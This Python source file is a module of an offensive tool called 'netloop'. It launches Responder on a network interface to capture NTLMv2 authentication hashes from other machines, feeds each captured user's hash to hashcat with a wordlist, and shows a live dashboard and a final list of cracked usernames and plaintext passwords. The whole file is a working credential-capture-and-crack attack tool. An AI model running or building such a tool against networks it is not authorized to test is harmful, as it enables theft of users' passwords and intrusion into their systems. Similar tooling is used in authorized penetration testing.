#!/usr/bin/env python3
"""getinit_1: NTLMv2 capture and crack module for netloop."""

from __future__ import annotations

import argparse
import json
import os
import re
import select
import shlex
import shutil
import signal
import subprocess
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple


HOME_CONFIG_PATH = Path.home() / ".netloop_config.json"
LOCAL_CONFIG_PATH = Path.cwd() / ".netloop_config.json"
DEFAULT_RESPONDER_FLAGS = "-w"
DEFAULT_HASHCAT_FLAGS = "-m 5600"
DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"
HASH_FILE_GLOB = "*NTLMv2*.txt"
ANSI_RE = re.compile(r"\x1B\[[0-?]*[ -/]*[@-~]")
NTLMV2_IN_LINE_RE = re.compile(r"([^\s:]+::[^\s:]+:[0-9A-Fa-f]{16,}:[0-9A-Fa-f]{16,}:[0-9A-Fa-f]+)")


class Color:
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    CYAN = "\033[36m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def supports_color() -> bool:
    return sys.stdout.isatty() and os.environ.get("TERM", "") != "dumb"


def supports_inplace_redraw() -> bool:
    term = os.environ.get("TERM", "")
    return term not in ("", "dumb")


def c(text: str, color: str) -> str:
    if not supports_color():
        return text
    return f"{color}{text}{Color.RESET}"


@dataclass
class Stats:
    captured_auth_events: int = 0
    ntlmv2_hash_lines: int = 0
    unique_users: Set[str] = field(default_factory=set)
    user_to_hash: Dict[str, str] = field(default_factory=dict)
    seen_hashes: Set[str] = field(default_factory=set)


@dataclass
class CrackState:
    pending_users: List[str] = field(default_factory=list)
    queued_users: Set[str] = field(default_factory=set)
    processed_users: Set[str] = field(default_factory=set)
    active_user: Optional[str] = None
    active_hash_file: Optional[Path] = None
    active_proc: Optional[subprocess.Popen[str]] = None
    active_percent: float = 0.0
    active_rate_hps: float = 0.0
    active_status: str = "idle"
    cracked_lines: List[str] = field(default_factory=list)
    cracked_seen: Set[str] = field(default_factory=set)
    completed_jobs: int = 0
    hashcat_errors: int = 0
    cracked_users: Set[str] = field(default_factory=set)
    previously_cracked_seen_this_run: Set[str] = field(default_factory=set)
    jobs: List["CrackJob"] = field(default_factory=list)
    active_job_index: Optional[int] = None
    last_completed_command: str = ""


@dataclass
class CrackJob:
    user: str
    command: str
    status: str = "running"
    percent: float = 0.0
    rate_hps: float = 0.0


def strip_ansi(text: str) -> str:
    return ANSI_RE.sub("", text)


def verbose_print(enabled: bool, line: str) -> None:
    if enabled:
        print(line, flush=True)


def canonical_user(user: str) -> str:
    return user.strip().lower()


def sanitize_for_filename(value: str) -> str:
    return re.sub(r"[^A-Za-z0-9._-]", "_", value)


def format_usernames(users: Set[str], max_display: int = 6) -> str:
    if not users:
        return "none"
    sorted_users = sorted(users)
    if len(sorted_users) <= max_display:
        return ", ".join(sorted_users)
    shown = ", ".join(sorted_users[:max_display])
    remaining = len(sorted_users) - max_display
    return f"{shown}, +{remaining} more"


def build_progress_bar(percent: float, width: int = 24) -> str:
    bounded = max(0.0, min(100.0, percent))
    fill = int((bounded / 100.0) * width)
    bar = "#" * fill + "-" * (width - fill)
    return f"[{bar}] {bounded:6.2f}%"


def parse_hashcat_progress(status_json: dict) -> Optional[float]:
    progress = status_json.get("progress")
    if isinstance(progress, list) and len(progress) >= 2:
        done, total = progress[0], progress[1]
        if isinstance(done, (int, float)) and isinstance(total, (int, float)) and total > 0:
            return float(done) * 100.0 / float(total)
    if isinstance(progress, (int, float)):
        total = status_json.get("progress_total")
        if isinstance(total, (int, float)) and total > 0:
            return float(progress) * 100.0 / float(total)
    return None


def parse_hashcat_rate_hps(status_json: dict) -> Optional[float]:
    speed_value = status_json.get("speed")
    if speed_value is None:
        speed_value = status_json.get("speed_sec")

    if isinstance(speed_value, (int, float)):
        return float(speed_value)

    if isinstance(speed_value, list):
        total = 0.0
        found = False
        for item in speed_value:
            if isinstance(item, (int, float)):
                total += float(item)
                found = True
            elif isinstance(item, list) and item:
                val = item[0]
                if isinstance(val, (int, float)):
                    total += float(val)
                    found = True
        if found:
            return total
    return None


def humanize_hps(rate_hps: float) -> str:
    if rate_hps < 1_000:
        return f"{rate_hps:.0f} H/s"
    if rate_hps < 1_000_000:
        return f"{rate_hps / 1_000:.2f} kH/s"
    if rate_hps < 1_000_000_000:
        return f"{rate_hps / 1_000_000:.2f} MH/s"
    return f"{rate_hps / 1_000_000_000:.2f} GH/s"


def get_config_path() -> Path:
    if LOCAL_CONFIG_PATH.exists():
        return LOCAL_CONFIG_PATH
    return HOME_CONFIG_PATH


def load_config() -> dict:
    config_path = get_config_path()
    if not config_path.exists():
        return {}
    try:
        return json.loads(config_path.read_text(encoding="utf-8"))
    except Exception:
        return {}


def load_cracked_users() -> Set[str]:
    cfg = load_config()
    ntlmv2_cfg = cfg.get("ntlmv2", {})
    users = ntlmv2_cfg.get("cracked_users", [])
    if not isinstance(users, list):
        return set()
    return {canonical_user(str(user)) for user in users if str(user).strip()}


def save_cracked_users(cracked_users: Set[str]) -> None:
    cfg = load_config()
    ntlmv2_cfg = cfg.get("ntlmv2", {})
    ntlmv2_cfg["cracked_users"] = sorted(canonical_user(user) for user in cracked_users if user)
    cfg["ntlmv2"] = ntlmv2_cfg
    save_config(cfg)


def save_config(config: dict) -> None:
    config_path = get_config_path()
    try:
        config_path.write_text(json.dumps(config, indent=2), encoding="utf-8")
        return
    except OSError:
        fallback = LOCAL_CONFIG_PATH if config_path != LOCAL_CONFIG_PATH else HOME_CONFIG_PATH
        fallback.write_text(json.dumps(config, indent=2), encoding="utf-8")


def prompt_with_default(prompt: str, default: str) -> str:
    value = input(f"{prompt} [{default}]: ").strip()
    return value or default


def parse_hash_line(line: str) -> Optional[Tuple[str, str]]:
    clean = strip_ansi(line).strip()
    if not clean:
        return None

    match = NTLMV2_IN_LINE_RE.search(clean)
    if match:
        clean = match.group(1)

    if "::" not in clean or clean.count(":") < 4:
        return None
    user = clean.split("::", 1)[0].strip()
    if not user:
        return None
    return user, clean


def ingest_hash(stats: Stats, user: str, full_hash: str) -> None:
    if full_hash in stats.seen_hashes:
        return
    stats.seen_hashes.add(full_hash)
    stats.ntlmv2_hash_lines += 1
    stats.unique_users.add(user)
    stats.user_to_hash.setdefault(user, full_hash)


def parse_responder_stream_line(line: str, stats: Stats) -> None:
    clean_line = strip_ansi(line)
    lower_line = clean_line.lower()
    if "ntlmv2-ssp client" in lower_line:
        stats.captured_auth_events += 1

    if "NTLMv2-SSP Hash" in clean_line:
        if "NTLMv2-SSP Hash" not in clean_line:
            return
        candidate = clean_line.split("NTLMv2-SSP Hash", 1)[1].lstrip(" :")
        parsed = parse_hash_line(candidate)
        if parsed:
            ingest_hash(stats, parsed[0], parsed[1])


def discover_responder_log_paths(session_dir: Path) -> List[Path]:
    candidate_dirs = [
        session_dir,
        Path.cwd(),
        Path("/usr/share/responder/logs"),
        Path("/usr/local/share/responder/logs"),
    ]
    paths: List[Path] = []
    for base in candidate_dirs:
        if not base.exists():
            continue
        for pattern in ("*Session.log", "*.log"):
            for log_file in sorted(base.glob(pattern)):
                if log_file.is_file():
                    paths.append(log_file)
    deduped: List[Path] = []
    seen: Set[Path] = set()
    for path in paths:
        if path in seen:
            continue
        seen.add(path)
        deduped.append(path)
    paths = deduped
    return paths


def discover_hash_file_paths(session_dir: Path) -> List[Path]:
    candidate_dirs = [
        session_dir,
        Path.cwd(),
        Path("/usr/share/responder/logs"),
        Path("/usr/local/share/responder/logs"),
    ]
    paths: List[Path] = []
    for base in candidate_dirs:
        if not base.exists():
            continue
        for hash_file in sorted(base.glob(HASH_FILE_GLOB)):
            if hash_file.is_file():
                paths.append(hash_file)
    deduped: List[Path] = []
    seen: Set[Path] = set()
    for path in paths:
        if path in seen:
            continue
        seen.add(path)
        deduped.append(path)
    return deduped


def poll_responder_logs(stats: Stats, offsets: Dict[Path, int], paths: List[Path]) -> None:
    for path in paths:
        try:
            with path.open("r", encoding="utf-8", errors="ignore") as handle:
                previous = offsets.get(path, 0)
                try:
                    current_size = path.stat().st_size
                except OSError:
                    current_size = previous
                if previous > current_size:
                    previous = 0
                handle.seek(previous)
                for line in handle:
                    parse_responder_stream_line(line.rstrip("\n"), stats)
                offsets[path] = handle.tell()
        except OSError:
            continue


def poll_hash_files(stats: Stats, offsets: Dict[Path, int], paths: List[Path]) -> None:
    for path in paths:
        try:
            with path.open("r", encoding="utf-8", errors="ignore") as handle:
                previous = offsets.get(path, 0)
                try:
                    current_size = path.stat().st_size
                except OSError:
                    current_size = previous
                if previous > current_size:
                    previous = 0
                handle.seek(previous)
                for line in handle:
                    parsed = parse_hash_line(line.rstrip("\n"))
                    if parsed:
                        ingest_hash(stats, parsed[0], parsed[1])
                offsets[path] = handle.tell()
        except OSError:
            continue


def refresh_responder_log_paths(
    session_dir: Path, paths: List[Path], offsets: Dict[Path, int]
) -> Tuple[List[Path], Dict[Path, int]]:
    discovered = discover_responder_log_paths(session_dir)
    for path in discovered:
        if path not in paths:
            paths.append(path)
            try:
                offsets[path] = path.stat().st_size
            except OSError:
                offsets[path] = 0
    return paths, offsets


def refresh_hash_file_paths(
    session_dir: Path, paths: List[Path], offsets: Dict[Path, int]
) -> Tuple[List[Path], Dict[Path, int]]:
    discovered = discover_hash_file_paths(session_dir)
    for path in discovered:
        if path not in paths:
            paths.append(path)
            try:
                offsets[path] = path.stat().st_size
            except OSError:
                offsets[path] = 0
    return paths, offsets


def enqueue_new_hashes_for_cracking(stats: Stats, crack_state: CrackState) -> None:
    for user in sorted(stats.user_to_hash.keys()):
        canon = canonical_user(user)
        if canon in crack_state.cracked_users:
            crack_state.processed_users.add(user)
            if canon not in crack_state.previously_cracked_seen_this_run:
                crack_state.previously_cracked_seen_this_run.add(canon)
                crack_state.cracked_lines.append(
                    f"{user}::PREVIOUSLY_CRACKED:already-cracked-in-earlier-run"
                )
            continue
        if user in crack_state.processed_users:
            continue
        if user == crack_state.active_user:
            continue
        if user in crack_state.queued_users:
            continue
        crack_state.pending_users.append(user)
        crack_state.queued_users.add(user)


def start_next_hashcat_job(
    crack_state: CrackState,
    stats: Stats,
    hashcat_path: str,
    hashcat_flags: List[str],
    wordlist: str,
    session_dir: Path,
    session_name_prefix: str,
) -> None:
    if crack_state.active_proc is not None:
        return
    if not crack_state.pending_users:
        return

    user = crack_state.pending_users.pop(0)
    user_hash = stats.user_to_hash.get(user)
    if not user_hash:
        crack_state.queued_users.discard(user)
        return

    hash_dir = session_dir / "hash_inputs"
    hash_dir.mkdir(parents=True, exist_ok=True)
    safe_user = sanitize_for_filename(user)
    hash_file = hash_dir / f"{safe_user}.txt"
    hash_file.write_text(user_hash + "\n", encoding="utf-8")

    crack_state.active_user = user
    crack_state.active_hash_file = hash_file
    crack_state.active_percent = 0.0
    crack_state.active_status = "running"

    cmd = [
        hashcat_path,
        *hashcat_flags,
        "--quiet",
        "--session",
        f"{session_name_prefix}-{safe_user}-{int(time.time())}",
        "--restore-disable",
        "--status",
        "--status-json",
        "--status-timer",
        "1",
        "--potfile-path",
        str(session_dir / "netloop.potfile"),
        str(hash_file),
        wordlist,
    ]
    cmd_text = " ".join(shlex.quote(part) for part in cmd)
    crack_state.jobs.append(CrackJob(user=user, command=cmd_text))
    crack_state.active_job_index = len(crack_state.jobs) - 1
    crack_state.active_proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.DEVNULL,
        text=True,
        bufsize=1,
    )


def poll_hashcat_state(crack_state: CrackState, verbose: bool = False) -> None:
    proc = crack_state.active_proc
    if proc is None or proc.stdout is None:
        return

    fd = proc.stdout.fileno()
    while True:
        ready, _, _ = select.select([fd], [], [], 0)
        if not ready:
            break
        line = proc.stdout.readline()
        if not line:
            break
        verbose_print(verbose, line.rstrip("\n"))
        clean = strip_ansi(line).strip()
        if not clean:
            continue
        try:
            status_json = json.loads(clean)
        except json.JSONDecodeError:
            continue
        percent = parse_hashcat_progress(status_json)
        if percent is not None:
            crack_state.active_percent = percent
            crack_state.active_status = str(status_json.get("status", "running"))
            if crack_state.active_job_index is not None:
                crack_state.jobs[crack_state.active_job_index].percent = percent
                crack_state.jobs[crack_state.active_job_index].status = "running"
        rate_hps = parse_hashcat_rate_hps(status_json)
        if rate_hps is not None:
            crack_state.active_rate_hps = rate_hps
            if crack_state.active_job_index is not None:
                crack_state.jobs[crack_state.active_job_index].rate_hps = rate_hps


def finalize_hashcat_job(
    crack_state: CrackState,
    hashcat_path: str,
    hashcat_flags: List[str],
    verbose: bool = False,
) -> None:
    proc = crack_state.active_proc
    user = crack_state.active_user
    hash_file = crack_state.active_hash_file
    if proc is None or user is None or hash_file is None:
        return

    if proc.stdout is not None:
        for line in proc.stdout:
            verbose_print(verbose, line.rstrip("\n"))
            clean = strip_ansi(line).strip()
            if not clean:
                continue
            try:
                status_json = json.loads(clean)
            except json.JSONDecodeError:
                continue
            percent = parse_hashcat_progress(status_json)
            if percent is not None:
                crack_state.active_percent = percent
                crack_state.active_status = str(status_json.get("status", crack_state.active_status))
            rate_hps = parse_hashcat_rate_hps(status_json)
            if rate_hps is not None:
                crack_state.active_rate_hps = rate_hps

    rc = proc.wait()
    if rc != 0:
        crack_state.hashcat_errors += 1

    show_cmd = [hashcat_path, *hashcat_flags, "--show", str(hash_file)]
    show_proc = subprocess.run(show_cmd, text=True, capture_output=True)
    cracked_for_job = False
    for row in show_proc.stdout.splitlines():
        clean_row = strip_ansi(row).strip()
        if not clean_row:
            continue
        if clean_row in crack_state.cracked_seen:
            continue
        crack_state.cracked_seen.add(clean_row)
        crack_state.cracked_lines.append(clean_row)
        cracked_for_job = True
        if "::" in clean_row:
            cracked_user = clean_row.split("::", 1)[0].strip()
            if cracked_user:
                crack_state.cracked_users.add(canonical_user(cracked_user))

    crack_state.completed_jobs += 1
    crack_state.processed_users.add(user)
    crack_state.queued_users.discard(user)
    crack_state.active_user = None
    crack_state.active_hash_file = None
    crack_state.active_proc = None
    crack_state.active_percent = 0.0
    crack_state.active_rate_hps = 0.0
    crack_state.active_status = "idle"
    if crack_state.active_job_index is not None:
        job = crack_state.jobs[crack_state.active_job_index]
        if rc != 0:
            job.status = f"error ({rc})"
        elif cracked_for_job:
            job.status = "finished (cracked)"
        else:
            job.status = "finished (not cracked)"
        crack_state.last_completed_command = job.command
    crack_state.active_job_index = None


def render_stats(stats: Stats, live: bool = False) -> None:
    prefix = "LIVE" if live else "FINAL"
    status = (
        f"{c(prefix, Color.CYAN)} | "
        f"Auth Events: {c(str(stats.captured_auth_events), Color.BLUE)} | "
        f"NTLMv2 Captured: {c(str(stats.ntlmv2_hash_lines), Color.GREEN)} | "
        f"Unique Users: {c(str(len(stats.unique_users)), Color.CYAN)}"
    )
    print(status)


def render_live_dashboard(
    stats: Stats,
    crack_state: CrackState,
    interface: str,
    responder_flags: str,
    started_at: float,
    auto_stop_seconds: int,
) -> List[str]:
    elapsed = int(time.time() - started_at)
    timer_text = f"{elapsed}s"
    if auto_stop_seconds > 0:
        remaining = max(0, auto_stop_seconds - elapsed)
        timer_text = f"{elapsed}s elapsed | {remaining}s to auto-stop"

    cracking_line = c("Cracking: idle", Color.YELLOW)
    idle_command_line = ""
    if crack_state.active_user:
        bar = build_progress_bar(crack_state.active_percent)
        rate_text = humanize_hps(crack_state.active_rate_hps)
        cracking_line = (
            f"Cracking user: {c(crack_state.active_user, Color.CYAN)} "
            f"{c(bar, Color.GREEN)} | Rate: {c(rate_text, Color.BLUE)}"
        )
    elif crack_state.last_completed_command:
        idle_command_line = c(
            f"Last hashcat command: {crack_state.last_completed_command}",
            Color.BLUE,
        )

    queue_depth = len(crack_state.pending_users) + (1 if crack_state.active_user else 0)
    recent_cracks = crack_state.cracked_lines[-2:]
    recent_lines = [f"  {line}" for line in recent_cracks] if recent_cracks else ["  none yet"]
    users_line = format_usernames(stats.unique_users)
    cracked_user_count = len(
        {canonical_user(user) for user in stats.unique_users}.intersection(crack_state.cracked_users)
    )
    job_lines: List[str] = []
    if crack_state.jobs:
        for idx, job in enumerate(crack_state.jobs, start=1):
            if job.status == "running":
                job_lines.append(
                    f"  {idx}. {job.user} - in progress ({job.percent:5.2f}%, {humanize_hps(job.rate_hps)})"
                )
            else:
                job_lines.append(f"  {idx}. {job.user} - {job.status}")
    else:
        job_lines = ["  none yet"]

    lines = [
        c("Netloop Live Overview", Color.BOLD),
        f"Mode: NTLMv2 capture/crack | Interface: {interface}",
        f"Responder Flags: {responder_flags}",
        f"Runtime: {timer_text}",
        "",
        f"Captured auth events: {c(str(stats.captured_auth_events), Color.BLUE)}",
        f"NTLMv2 hashes captured: {c(str(stats.ntlmv2_hash_lines), Color.GREEN)}",
        f"Unique users captured: {c(str(len(stats.unique_users)), Color.CYAN)}",
        f"Unique usernames: {users_line}",
        "",
        cracking_line,
    ]
    if idle_command_line:
        lines.append(idle_command_line)
    lines.extend(
        [
        (
            f"Crack queue: {queue_depth} | Completed jobs: {crack_state.completed_jobs} | "
            f"Cracked users: {cracked_user_count}"
        ),
        "Cracking jobs:",
        *job_lines,
        "Recent cracked:",
        *recent_lines,
        "",
        c("Ctrl-C: stop responder capture (cracking continues).", Color.CYAN),
        ]
    )
    return lines


def draw_live_dashboard(lines: List[str], previous_line_count: int) -> int:
    if not supports_inplace_redraw():
        print(" | ".join(line for line in lines if line.strip()))
        return len(lines)

    if previous_line_count > 0:
        sys.stdout.write(f"\033[{previous_line_count}A\r")

    for line in lines:
        sys.stdout.write("\033[2K" + line + "\n")

    if previous_line_count > len(lines):
        for _ in range(previous_line_count - len(lines)):
            sys.stdout.write("\033[2K\n")

    sys.stdout.flush()
    return len(lines)


def run_capture_and_crack(
    interface: str,
    responder_flags: str,
    wordlist: str,
    hashcat_flags: str,
    session_dir: Path,
    stats: Stats,
    auto_stop_seconds: int,
    persisted_cracked_users: Set[str],
    verbose: bool = False,
) -> Tuple[int, CrackState]:
    responder_path = shutil.which("responder")
    if not responder_path:
        print(c("Error: responder not found in PATH.", Color.RED))
        return 127, CrackState()

    hashcat_path = shutil.which("hashcat")
    hashcat_missing_warned = False

    cmd = [responder_path, "-I", interface] + shlex.split(responder_flags)
    print(c(f"Starting responder: {' '.join(cmd)}", Color.CYAN))
    if verbose:
        print(c("Verbose mode enabled: streaming responder/hashcat output.", Color.YELLOW))
        print(c("Verbose mode display: raw logs + periodic status snapshots.", Color.YELLOW))

    interrupted = False
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        cwd=str(session_dir),
        bufsize=1,
    )

    start = time.time()
    session_name_prefix = f"netloop-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
    parsed_hashcat_flags = shlex.split(hashcat_flags)
    crack_state = CrackState(cracked_users=set(persisted_cracked_users))
    responder_logs = discover_responder_log_paths(session_dir)
    if verbose and responder_logs:
        for path in responder_logs:
            print(c(f"[verbose] monitoring responder log: {path}", Color.CYAN))
    elif verbose:
        print(c("[verbose] no responder logs discovered yet; will keep scanning.", Color.CYAN))
    log_offsets: Dict[Path, int] = {}
    for log_path in responder_logs:
        try:
            log_offsets[log_path] = log_path.stat().st_size
        except OSError:
            log_offsets[log_path] = 0

    hash_paths = discover_hash_file_paths(session_dir)
    hash_offsets: Dict[Path, int] = {}
    for hash_path in hash_paths:
        try:
            hash_offsets[hash_path] = hash_path.stat().st_size
        except OSError:
            hash_offsets[hash_path] = 0
    if verbose and hash_paths:
        for path in hash_paths:
            print(c(f"[verbose] monitoring hash file: {path}", Color.CYAN))

    dashboard_lines: List[str] = render_live_dashboard(
        stats, crack_state, interface, responder_flags, start, auto_stop_seconds
    )
    dashboard_height = 0 if verbose else draw_live_dashboard(dashboard_lines, previous_line_count=0)
    auto_stop_triggered = False
    last_refresh = 0.0
    responder_stop_requested = False
    interrupted = False

    try:
        assert proc.stdout is not None
        fd = proc.stdout.fileno()
        while True:
            try:
                if proc.poll() is None:
                    ready, _, _ = select.select([fd], [], [], 0.20)
                    if ready:
                        line = proc.stdout.readline()
                        if line:
                            verbose_print(verbose, line.rstrip("\n"))
                            parse_responder_stream_line(line.rstrip("\n"), stats)
                poll_responder_logs(stats, log_offsets, responder_logs)
                responder_logs, log_offsets = refresh_responder_log_paths(
                    session_dir, responder_logs, log_offsets
                )
                poll_hash_files(stats, hash_offsets, hash_paths)
                hash_paths, hash_offsets = refresh_hash_file_paths(session_dir, hash_paths, hash_offsets)

                enqueue_new_hashes_for_cracking(stats, crack_state)

                if hashcat_path and Path(wordlist).exists():
                    if crack_state.active_proc is None:
                        start_next_hashcat_job(
                            crack_state,
                            stats,
                            hashcat_path,
                            parsed_hashcat_flags,
                            wordlist,
                            session_dir,
                            session_name_prefix,
                        )
                    poll_hashcat_state(crack_state, verbose=verbose)
                    if crack_state.active_proc and crack_state.active_proc.poll() is not None:
                        finalize_hashcat_job(
                            crack_state, hashcat_path, parsed_hashcat_flags, verbose=verbose
                        )
                else:
                    if not hashcat_missing_warned:
                        hashcat_missing_warned = True
                        if not hashcat_path:
                            print(c("Warning: hashcat not found in PATH. Capture only mode.", Color.YELLOW))
                        elif not Path(wordlist).exists():
                            print(c(f"Warning: wordlist not found: {wordlist}. Capture only mode.", Color.YELLOW))

                now = time.time()
                if now - last_refresh >= 1.0:
                    dashboard_lines = render_live_dashboard(
                        stats, crack_state, interface, responder_flags, start, auto_stop_seconds
                    )
                    if verbose:
                        print(
                            "[live] "
                            f"t={int(now - start)}s "
                            f"auth={stats.captured_auth_events} "
                            f"hashes={stats.ntlmv2_hash_lines} "
                            f"users={len(stats.unique_users)} "
                            f"queue={len(crack_state.pending_users) + (1 if crack_state.active_user else 0)} "
                            f"cracked={len(crack_state.cracked_users.intersection({canonical_user(u) for u in stats.unique_users}))}"
                        )
                    else:
                        dashboard_height = draw_live_dashboard(
                            dashboard_lines, previous_line_count=dashboard_height
                        )
                    last_refresh = now

                if (
                    proc.poll() is None
                    and auto_stop_seconds > 0
                    and now - start >= auto_stop_seconds
                ):
                    auto_stop_triggered = True
                    responder_stop_requested = True
                    proc.send_signal(signal.SIGINT)

                if responder_stop_requested and proc.poll() is None:
                    proc.send_signal(signal.SIGINT)

                responder_finished = proc.poll() is not None
                cracking_finished = crack_state.active_proc is None and not crack_state.pending_users
                if responder_finished and cracking_finished:
                    break
            except KeyboardInterrupt:
                if not responder_stop_requested and proc.poll() is None:
                    interrupted = True
                    responder_stop_requested = True
                    proc.send_signal(signal.SIGINT)
                    continue
                interrupted = True
                if proc.poll() is None:
                    proc.send_signal(signal.SIGINT)
                if crack_state.active_proc and crack_state.active_proc.poll() is None:
                    crack_state.active_proc.send_signal(signal.SIGINT)
                break
    except KeyboardInterrupt:
        interrupted = True
        proc.send_signal(signal.SIGINT)
    finally:
        try:
            proc.wait(timeout=15)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

    if crack_state.active_proc and crack_state.active_proc.poll() is not None and hashcat_path:
        finalize_hashcat_job(crack_state, hashcat_path, parsed_hashcat_flags, verbose=verbose)

    print()
    if auto_stop_triggered:
        print(c("Auto-stop timer reached. Stopping responder.", Color.YELLOW))
    elif interrupted:
        print(c("Capture stopped by user.", Color.YELLOW))

    if interrupted and proc.returncode is None:
        return 130, crack_state
    return (proc.returncode or 0), crack_state


def format_cracked_rows(rows: List[str]) -> List[str]:
    formatted: List[str] = []
    for row in rows:
        if ":" not in row:
            formatted.append(row)
            continue
        hash_part, plain = row.rsplit(":", 1)
        user = hash_part.split("::", 1)[0]
        formatted.append(f"{user}: {plain}")
    return formatted


def resolve_inputs(parsed_args: argparse.Namespace) -> Tuple[str, str, str, str]:
    cfg = load_config()
    ntlmv2_cfg = cfg.get("ntlmv2", {})

    interface = parsed_args.interface
    if not interface:
        interface_default = ntlmv2_cfg.get("interface", "tun0")
        interface = prompt_with_default("Interface", interface_default)

    responder_flags = parsed_args.responder_flags
    if responder_flags is None:
        responder_flags = prompt_with_default(
            "Responder Flags",
            ntlmv2_cfg.get("responder_flags", DEFAULT_RESPONDER_FLAGS),
        )

    wordlist = parsed_args.wordlist
    if wordlist is None:
        wordlist = prompt_with_default("Wordlist", ntlmv2_cfg.get("wordlist", DEFAULT_WORDLIST))

    hashcat_flags = parsed_args.hashcat_flags
    if hashcat_flags is None:
        hashcat_flags = prompt_with_default(
            "Hashcat Flags",
            ntlmv2_cfg.get("hashcat_flags", DEFAULT_HASHCAT_FLAGS),
        )

    cfg["ntlmv2"] = {
        "interface": interface,
        "responder_flags": responder_flags,
        "wordlist": wordlist,
        "hashcat_flags": hashcat_flags,
        "cracked_users": ntlmv2_cfg.get("cracked_users", []),
    }
    save_config(cfg)
    return interface, responder_flags, wordlist, hashcat_flags


def write_unique_hash_file(session_dir: Path, user_to_hash: Dict[str, str]) -> Path:
    out = session_dir / "unique_ntlmv2_hashes.txt"
    lines = [user_to_hash[user] for user in sorted(user_to_hash.keys())]
    out.write_text("\n".join(lines) + ("\n" if lines else ""), encoding="utf-8")
    return out


# ---------------------------------------------------------------------------
# Public API used by netloop.py
# ---------------------------------------------------------------------------

def configure_parser(subparsers: argparse._SubParsersAction) -> None:
    """Register the 'ntlmv2' subcommand on the shared argparse subparsers."""
    ntlmv2 = subparsers.add_parser("ntlmv2", help="capture and crack NTLMv2 hashes")
    ntlmv2.add_argument("-I", "--interface", help="network interface for responder")
    ntlmv2.add_argument("--responder-flags", help="extra responder flags")
    ntlmv2.add_argument("--wordlist", help="wordlist path for hashcat")
    ntlmv2.add_argument("--hashcat-flags", help="extra/default hashcat flags")
    ntlmv2.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="show full responder/hashcat output for debugging",
    )
    ntlmv2.add_argument(
        "--auto-stop-seconds",
        type=int,
        default=0,
        help="optional timeout to stop responder automatically",
    )


def run(parsed_args: argparse.Namespace) -> int:
    """Execute the NTLMv2 capture-and-crack workflow. Returns exit code."""
    interface, responder_flags, wordlist, hashcat_flags = resolve_inputs(parsed_args)
    if parsed_args.verbose:
        print(c(f"[verbose] active config file: {get_config_path()}", Color.CYAN))
        print(c(f"[verbose] responder flags in use: {responder_flags}", Color.CYAN))
        print(c(f"[verbose] hashcat flags in use: {hashcat_flags}", Color.CYAN))

    persisted_cracked_users = load_cracked_users()
    session_stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    session_dir = Path.cwd() / "netloop_runs" / session_stamp
    session_dir.mkdir(parents=True, exist_ok=True)
    print(c(f"Session directory: {session_dir}", Color.CYAN))

    stats = Stats()
    responder_rc, crack_state = run_capture_and_crack(
        interface,
        responder_flags,
        wordlist,
        hashcat_flags,
        session_dir,
        stats,
        parsed_args.auto_stop_seconds,
        persisted_cracked_users,
        verbose=parsed_args.verbose,
    )
    save_cracked_users(crack_state.cracked_users)

    print()
    render_stats(stats, live=False)
    print(c(f"Responder exited with code: {responder_rc}", Color.CYAN))

    if not stats.user_to_hash:
        print(c("No NTLMv2 hashes captured. Nothing to crack.", Color.YELLOW))
        return 0 if responder_rc in (0, 130) else responder_rc

    unique_hash_file = write_unique_hash_file(session_dir, stats.user_to_hash)
    cracked_display = format_cracked_rows(crack_state.cracked_lines)
    crack_rc = 0 if crack_state.hashcat_errors == 0 else 1
    cracked_users_this_capture = sorted(
        user for user in stats.unique_users if canonical_user(user) in crack_state.cracked_users
    )

    print("\n" + c("Overview", Color.BOLD))
    print(f"- Captured auth events: {stats.captured_auth_events}")
    print(f"- NTLMv2 hashes captured: {stats.ntlmv2_hash_lines}")
    print(f"- Unique users with captured hashes: {len(stats.unique_users)}")
    print(f"- Unique usernames: {', '.join(sorted(stats.unique_users)) if stats.unique_users else 'none'}")
    print(
        f"- Considered cracked users this run: "
        f"{', '.join(cracked_users_this_capture) if cracked_users_this_capture else 'none'}"
    )
    print(f"- Hash input file (one per user): {unique_hash_file}")
    print(f"- Hashcat jobs completed: {crack_state.completed_jobs}")
    print(f"- Hashcat job errors: {crack_state.hashcat_errors}")
    print(f"- Hashcat status code: {crack_rc}")

    if cracked_display:
        print(c("\nCracked hashes:", Color.GREEN))
        for row in cracked_display:
            print(f"  - {row}")
    else:
        print(c("\nNo cracked hashes yet.", Color.YELLOW))

    return 0 if crack_rc == 0 else crack_rc
